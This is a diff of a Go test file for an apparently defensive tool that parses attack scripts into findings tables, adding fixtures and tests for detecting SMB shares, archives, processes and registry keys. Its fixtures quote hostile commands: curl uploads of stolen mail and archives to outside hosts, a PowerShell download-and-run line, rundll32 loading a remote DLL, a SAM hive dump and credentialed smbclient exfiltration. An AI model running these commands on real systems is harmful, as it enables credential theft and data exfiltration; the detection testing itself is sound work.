@@ -85,8 +85,8 @@ func TestFindingsHoldWhatTheReportWrites(t *testing.T) {
 }
 
 // pivots writes a folder whose lines name addresses, hosts, accounts, a
-// tenant, an application and a task: in variables, on a line that a command
-// is continued on, twice in a file, and in a record that has no line.
+// tenant, a task, shares and archives: in variables, on a line a command is
+// continued on, twice in a file, and in a record that has no line.
 func pivots(t *testing.T) string {
 	t.Helper()
 	folder := t.TempDir()
@@ -101,6 +101,12 @@ func pivots(t *testing.T) string {
 		"20261101_093000_step04_mail.sh": "#!/bin/bash\n" +
 			"curl -s -H \"Authorization: Bearer $T\" \"https://graph.microsoft.com/v1.0/users/alice@corp.example/messages\" -o mail.json\n" +
 			"curl -T mail.json \"https://$USER@drop.example.net/in/\"\n",
+		"20261101_093500_step05_stage.ps1": "$fs = 'fs01.corp.local'\n" +
+			"Compress-Archive -Path C:\\Users\\Public\\loot -DestinationPath \\\\$fs\\finance\\loot.zip\n" +
+			"rundll32.exe \\\\10.20.1.9\\stage\\a.dll,Start\n" +
+			"reg save HKLM\\SAM \\\\10.20.1.9\\stage\\sam.save\n",
+		"20261101_093700_step06_send.sh": "#!/bin/bash\n" +
+			"tar czf /tmp/fin.tgz /srv/finance && smbclient //10.20.1.5/loot$ -U 'corp/svc%Winter2025!' -c 'put /tmp/fin.tgz fin.tgz'\n",
 		"audit_20261101_094000.jsonl": `{"cmd": "useradd -m -s /bin/bash helper"}` + "\n" +
 			`{"cmd": "curl -T /tmp/loot.tgz https://files.example.net/up --connect-to ::198.51.100.7:"}` + "\n",
 	} {
@@ -117,7 +123,10 @@ func TestFindingsNameWhatTheirLinesHold(t *testing.T) {
 	_, saved := report(t, pivots(t), "summary")
 	table := rows(t, filepath.Join(saved, "findings.json"))
 	sheet := rows(t, filepath.Join(saved, "findings.csv"))
-	columns := []string{"targets", "ip", "host", "url", "account", "tenant", "application", "task", "service"}
+	columns := []string{
+		"targets", "ip", "host", "port", "url", "share", "account", "tenant", "application", "role", "resource", "vault",
+		"secret", "key", "task", "service", "process", "command", "file", "archive", "log", "registry",
+	}
 	tests := []struct {
 		finding, indicator string
 		want               map[string]string
@@ -135,9 +144,12 @@ func TestFindingsNameWhatTheirLinesHold(t *testing.T) {
 			"targets": "task WindowsUpdateCheck; runs powershell -ep bypass -c IEX (iwr http://203.0.113.50/u.ps1",
 			"ip":      "203.0.113.50", "host": "dc01.corp.local", "url": "http://203.0.113.50/u.ps1",
 			"account": "admin, svc_task", "task": "WindowsUpdateCheck",
+			"command": "powershell -ep bypass -c IEX (iwr http://203.0.113.50/u.ps1",
 		}},
 		// A subject that is a variable is listed by its value, and is an address where it holds one.
-		{"ReverseShell", "", map[string]string{"targets": "host 203.0.113.41 ($H); port 4444 ($PORT)", "ip": "203.0.113.41", "host": "203.0.113.41"}},
+		{"ReverseShell", "", map[string]string{
+			"targets": "host 203.0.113.41 ($H); port 4444 ($PORT)", "ip": "203.0.113.41", "host": "203.0.113.41", "port": "4444",
+		}},
 		// A record of a structured output has no line, and names what is quoted of it.
 		{"AccountCreation", "", map[string]string{"targets": "account backdoor; account helper", "account": "backdoor, helper"}},
 		// A host of a vendor is none, and a domain is a host where a script names it.
@@ -149,6 +161,21 @@ func TestFindingsNameWhatTheirLinesHold(t *testing.T) {
 		{"FileUpload", "", map[string]string{
 			"targets": "url https://$USER@drop.example.net/in/; file mail.json; url https://files.example.net/up; file /tmp/loot.tgz",
 			"ip":      "198.51.100.7", "host": "drop.example.net", "url": "https://$USER@drop.example.net/in/, https://files.example.net/up",
+			"file": "mail.json, /tmp/loot.tgz",
+		}},
+		// A share is one value whichever way its slashes lean, with the value of the variable its host is.
+		{"ArchiveCreation", "", map[string]string{
+			"targets": `archive \\$fs\finance\loot.zip; archive /tmp/fin.tgz`,
+			"ip":      "10.20.1.5", "host": "fs01.corp.local", "share": `\\fs01.corp.local\finance, \\10.20.1.5\loot$`,
+			"archive": `\\fs01.corp.local\finance\loot.zip, /tmp/fin.tgz`,
+		}},
+		// A line names the share of any path on it, whatever the activity acts on.
+		{"SignedBinaryProxyExecution", "", map[string]string{
+			"targets": "binary rundll32", "ip": "10.20.1.9", "share": `\\10.20.1.9\stage`, "process": "rundll32",
+		}},
+		{"RegistryHiveDump", "", map[string]string{
+			"targets": `hive HKLM\SAM; file \\10.20.1.9\stage\sam.save`, "ip": "10.20.1.9", "share": `\\10.20.1.9\stage`,
+			"file": `\\10.20.1.9\stage\sam.save`, "registry": `HKLM\SAM`,
 		}},
 		{"IPv4", "203.0.113.41", map[string]string{"ip": "203.0.113.41"}},
 		{"Domain", "graph.microsoft.com", map[string]string{"host": "graph.microsoft.com"}},
@@ -184,6 +211,63 @@ func TestFindingsNameWhatTheirLinesHold(t *testing.T) {
 	}
 	if tactics == 0 {
 		t.Errorf("findings.json holds no tactic")
+	}
+}
+
+// A share is found by how a command writes it, and is written one way: a
+// path of Windows, the same in a string that doubles each backslash, the
+// path a tool of SMB is given, and an address of smb.
+func TestSharesAreFoundByTheirShape(t *testing.T) {
+	v, doc := reportSpec(t)
+	if _, err := (Env{}).reportVerb(v, doc); err != nil {
+		t.Fatal(err)
+	}
+	pipe, err := loadPipeline()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if pipe.entities, err = loadEntities(doc, pipe); err != nil {
+		t.Fatal(err)
+	}
+	tests := []struct {
+		name, text string
+		want       []string
+	}{
+		{"a drive mapped to a share", `net use Z: \\fs01.corp.local\finance /user:corp\svc Winter2025!`, []string{`\\fs01.corp.local\finance`}},
+		{"a file below an admin share", `copy a.exe \\10.20.1.5\C$\Windows\Temp\a.exe`, []string{`\\10.20.1.5\C$`}},
+		{"a share in quotes", `New-PSDrive -Name X -PSProvider FileSystem -Root "\\10.20.1.23\ADMIN$"`, []string{`\\10.20.1.23\ADMIN$`}},
+		{"a hidden share with a dot in its name", `dir \\fs01\hr.2026$\payroll`, []string{`\\fs01\hr.2026$`}},
+		{"a host that is a variable no file sets", `foreach ($h in $hosts) { copy a.exe \\$h\C$\Temp }`, []string{`\\$h\C$`}},
+		{"a host that is a variable of a batch file", `copy a.exe \\%TARGET%\ADMIN$\a.exe`, []string{`\\%TARGET%\ADMIN$`}},
+		{"two shares on a line", `robocopy \\fs01\finance \\10.20.1.9\stage /E`, []string{`\\fs01\finance`, `\\10.20.1.9\stage`}},
+		{"a share after a redirect", `whoami >\\10.20.1.9\stage\who.txt`, []string{`\\10.20.1.9\stage`}},
+		{"a string that doubles each backslash", `shutil.copy("a.exe", "\\\\dc01\\C$\\Windows\\a.exe")`, []string{`\\dc01\C$`}},
+		{"the path smbclient is given", `smbclient //10.20.1.5/C$ -U 'corp/administrator%P@ss' -c 'get x'`, []string{`\\10.20.1.5\C$`}},
+		{"the path mount is given", `mount -t cifs //fs01.corp.local/finance /mnt/fin -o username=svc`, []string{`\\fs01.corp.local\finance`}},
+		{"an address of smb", `smbget -R smb://svc@fs01/hr$/payroll`, []string{`\\fs01\hr$`}},
+		{"a host alone", `net view \\dc01.corp.local /all`, nil},
+		{"a listing of the shares of a host", `smbclient -L //10.20.1.5 -U svc`, nil},
+		{"a key of the registry", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater`, nil},
+		{"a path that doubles each backslash", `open("C:\\Users\\Public\\a.exe")`, nil},
+		{"a path with one backslash doubled", `type C:\\Users\Public\a.txt`, nil},
+		{"a namespace of WMI", `wmic /namespace:\\root\cimv2 path win32_process get name`, nil},
+		{"a pipe and a device", `echo x > \\.\pipe\lsass && dir \\?\C:\Windows`, nil},
+		{"an address of the web", `curl -T out.tgz https://files.example.net/up`, nil},
+		{"two slashes without a tool of SMB", `git clone //fs01/repo && xmllint --xpath //div/span a.html`, nil},
+		{"escapes of a string", `printf "a\\nb\\tc" | sed 's/\\\\/\//g' | grep -E "\\d+\\.\\d+"`, nil},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var got []string
+			for _, m := range pipe.mentions(tt.text, nil, true) {
+				if m.column == "share" {
+					got = append(got, m.value)
+				}
+			}
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("the shares of %q are %q, want %q", tt.text, got, tt.want)
+			}
+		})
 	}
 }
 
@@ -227,8 +311,20 @@ func TestLoadEntitiesRejects(t *testing.T) {
 		{"a label read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[2].Labels = []string{"host"} }, `reads the label "host", which another reads`},
 		{"a kind read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Kinds = []string{"ip"} }, `reads the kind of exposure "ip", which another reads`},
 		{"a type read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Indicators = []string{"IPv4"} }, `reads the indicator type "IPv4", which another reads`},
+		{"a pattern that does not compile", func(doc *commandsDoc) {
+			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(", Value: "${x}"}}
+		}, `the entity "ip": error parsing regexp`},
+		{"a value of a group the pattern lacks", func(doc *commandsDoc) {
+			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "${host} ${share}"}}
+		}, `writes "${host} ${share}", which names a group its pattern lacks`},
+		{"a value with a dollar that names nothing", func(doc *commandsDoc) {
+			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "$host"}}
+		}, `which names a group its pattern lacks`},
+		{"a value of no group", func(doc *commandsDoc) {
+			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "share"}}
+		}, `writes "share", which names no group of its pattern`},
 		{"entities of another class", func(doc *commandsDoc) { doc.Classes[0].Entities = doc.Classes[finding].Entities }, "the class file names entities"},
-		{"a column no entity fills", func(doc *commandsDoc) { doc.Classes[finding].Entities = doc.Classes[finding].Entities[1:] }, "the class finding declares 21 columns and fills 20"},
+		{"a column no entity fills", func(doc *commandsDoc) { doc.Classes[finding].Entities = doc.Classes[finding].Entities[1:] }, "the class finding declares 34 columns and fills 33"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -259,8 +355,21 @@ func TestEntitiesFillTheirColumns(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if want := []string{"ip", "host", "url", "account", "tenant", "application", "task", "service"}; !slices.Equal(table.columns, want) {
+	want := []string{
+		"ip", "host", "port", "url", "share", "account", "tenant", "application", "role", "resource", "vault", "secret", "key",
+		"task", "service", "process", "command", "file", "archive", "log", "registry",
+	}
+	if !slices.Equal(table.columns, want) {
 		t.Errorf("the entities fill %q, want %q", table.columns, want)
+	}
+	// What an activity acts on has a column, whatever its label: none is in targets alone.
+	for _, label := range pipe.activities.Labels() {
+		if table.byLabel[label] == "" {
+			t.Errorf("no entity reads the label %q, so what it names is in no column", label)
+		}
+	}
+	if len(table.shapes) == 0 || table.shapes[0].column != "share" {
+		t.Errorf("the shapes are %+v, want those that find a share", table.shapes)
 	}
 	for name, by := range map[string]map[string]string{"labels": table.byLabel, "kinds": table.byKind, "types": table.byType} {
 		for read, column := range by {
